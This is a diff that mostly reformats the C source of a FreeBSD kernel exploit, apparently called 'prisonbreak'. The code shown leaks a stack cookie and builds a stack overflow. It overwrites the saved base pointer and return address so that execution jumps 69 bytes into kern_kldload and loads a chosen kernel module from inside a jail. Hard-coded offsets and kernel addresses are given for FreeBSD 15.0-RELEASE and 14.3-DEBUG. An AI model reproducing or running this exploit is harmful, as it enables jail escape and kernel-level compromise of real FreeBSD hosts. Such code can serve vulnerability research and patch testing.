@@ -46,21 +46,17 @@ struct print_msg {
   char msg[0];
 };
 
-enum {
-    FBSD_15_RELEASE = 0,
-    FBSD_14_DEBUG   = 1,
-    UNKNOWN = 2
-};
+enum { FBSD_15_RELEASE = 0, FBSD_14_DEBUG = 1, UNKNOWN = 2 };
 
 struct kernel_offsets {
-    unsigned int stack_cookie_offset;
-    unsigned int td_offset;
-    unsigned int kernel_module_path_offset;
-    unsigned int fileid_offset;
-    unsigned int base_pointer_offset;
-    unsigned int instruction_pointer_offset;
-    uint64_t restored_ebp_address;
-    uint64_t kern_kldload_address;
+  unsigned int stack_cookie_offset;
+  unsigned int td_offset;
+  unsigned int kernel_module_path_offset;
+  unsigned int fileid_offset;
+  unsigned int base_pointer_offset;
+  unsigned int instruction_pointer_offset;
+  uint64_t restored_ebp_address;
+  uint64_t kern_kldload_address;
 };
 
 /*
@@ -70,28 +66,27 @@ struct kernel_offsets {
 static const struct kernel_offsets koffsets[] = {
     /* FreeBSD 15.0-RELEASE */
     {
-        .stack_cookie_offset         = 2832,
-        .td_offset                   = 2848,  /* 2872 - 24 */
-        .kernel_module_path_offset   = 2872,  /* 2864 + 8 */
-        .fileid_offset               = 2863,  /* 2840 + 23 */
-        .base_pointer_offset         = 2880,
-        .instruction_pointer_offset  = 2888,
-        .restored_ebp_address        = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
-        .kern_kldload_address        = 0xffffffff80b3db70,
+        .stack_cookie_offset = 2832,
+        .td_offset = 2848,                 /* 2872 - 24 */
+        .kernel_module_path_offset = 2872, /* 2864 + 8 */
+        .fileid_offset = 2863,             /* 2840 + 23 */
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
+        .kern_kldload_address = 0xffffffff80b3db70,
     },
 
     /* FreeBSD 14.3-DEBUG */
     {
-        .stack_cookie_offset         = 2832,
-        .td_offset                   = 2872,
-        .kernel_module_path_offset   = 2864,
-        .fileid_offset               = 2840,
-        .base_pointer_offset         = 2880,
-        .instruction_pointer_offset  = 2888,
-        .restored_ebp_address        = 0xfffffe0070e09cc0,
-        .kern_kldload_address        = 0xffffffff80af7af0,
-    }
-};
+        .stack_cookie_offset = 2832,
+        .td_offset = 2872,
+        .kernel_module_path_offset = 2864,
+        .fileid_offset = 2840,
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e09cc0,
+        .kern_kldload_address = 0xffffffff80af7af0,
+    }};
 
 /*
 Prerequisites
@@ -189,13 +184,11 @@ unsigned long get_pargs() {
 }
 
 /* XXX TODO, need to do a proper implementation based on uname() values */
-unsigned int get_platform_idx() {
-  return FBSD_14_DEBUG;
-}
+unsigned int get_platform_idx() { return FBSD_14_DEBUG; }
 
-void write_uint64(char *ptr, unsigned int offset, uint64_t value) {
-  char *dest = ptr + offset;
-  uint64_t *u64dest = (uint64_t *)dest;
+void write_uint64(char* ptr, unsigned int offset, uint64_t value) {
+  char* dest = ptr + offset;
+  uint64_t* u64dest = (uint64_t*)dest;
   *u64dest = value;
 }
 
@@ -264,7 +257,7 @@ uint64_t get_stack_cookie() {
   memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
   printf("STACK COOKIE: 0x%016" PRIx64 "\n", stack_cookie);
 
-  close(sock);  
+  close(sock);
   return stack_cookie;
 }
 
@@ -310,49 +303,49 @@ void* prisonbreak(void* arg) {
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
   // i.e., use the badge we got off that guard.
-//  int stack_cookie_offset = 2832;
-//  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
-//  *ptr = stack_cookie;
+  //  int stack_cookie_offset = 2832;
+  //  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
+  //  *ptr = stack_cookie;
   write_uint64((char*)header, ko.stack_cookie_offset, stack_cookie);
 
   // Overwrite the address where kern_kldload is going to read the td argument
-//  int td_offset = 2872;
+  //  int td_offset = 2872;
   // int td_offset = 2872 - 24;
-//  ptr = (unsigned long*)((char*)header + td_offset);
-//  *ptr = get_td();
+  //  ptr = (unsigned long*)((char*)header + td_offset);
+  //  *ptr = get_td();
   write_uint64((char*)header, ko.td_offset, get_td());
 
   // Overwrite the address where kern_kldload is going to read the string
   // containing our custom kernel module path
-//  int kernel_module_path_offset = 2864;
+  //  int kernel_module_path_offset = 2864;
   // int kernel_module_path_offset = 2864 + 8;
-//  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-//  *ptr = get_pargs();
+  //  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
+  //  *ptr = get_pargs();
   write_uint64((char*)header, ko.kernel_module_path_offset, get_pargs());
 
   // Overwrite the address where kern_kldload is going to read the fileid
-//  int fileid_offset = 2840;
+  //  int fileid_offset = 2840;
   // int fileid_offset = 2840 + 23;
-//  ptr = (unsigned long*)((char*)header + fileid_offset);
-//  *ptr = 0;
+  //  ptr = (unsigned long*)((char*)header + fileid_offset);
+  //  *ptr = 0;
   write_uint64((char*)header, ko.fileid_offset, 0);
-  
+
   // Restore $rbp
-//  int rbp_offset = 2880;
-//  ptr = (unsigned long*)((char*)header + rbp_offset);
-//  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
+  //  int rbp_offset = 2880;
+  //  ptr = (unsigned long*)((char*)header + rbp_offset);
+  //  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
   write_uint64((char*)header, ko.base_pointer_offset, ko.restored_ebp_address);
 
   // Overwrite the return address to jump into something we can use, e.g.
   // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
   // = 2888
-//  int return_address_offset = 2888;
-//  ptr = (unsigned long*)((char*)header + return_address_offset);
-//  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
+  //  int return_address_offset = 2888;
+  //  ptr = (unsigned long*)((char*)header + return_address_offset);
+  //  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
   // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
   // making sure none of the guards spot us.
-//  unsigned long jump_to_address = kern_kldload + 69;
-//  *ptr = jump_to_address;
+  //  unsigned long jump_to_address = kern_kldload + 69;
+  //  *ptr = jump_to_address;
   write_uint64((char*)header, ko.instruction_pointer_offset, ko.kern_kldload_address + 69);
 
   // Populate the header with expected values so we pass all the checks and get
